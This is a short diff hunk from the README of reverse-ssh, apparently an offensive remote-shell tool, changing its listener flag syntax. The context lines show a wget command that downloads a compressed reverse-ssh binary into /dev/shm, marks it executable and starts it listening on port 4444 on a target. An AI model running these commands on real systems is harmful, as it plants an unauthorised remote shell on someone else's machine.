@@ -49,7 +49,7 @@ Below is an example for `x86` with upx-compressed binaries. For other binaries, 
 # Drop it via your preferred way, e.g.
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
 
-/dev/shm/reverse-ssh -v -l :4444
+/dev/shm/reverse-ssh -v -l -p 4444
 ```
 
 * \(2a\) Linux target:
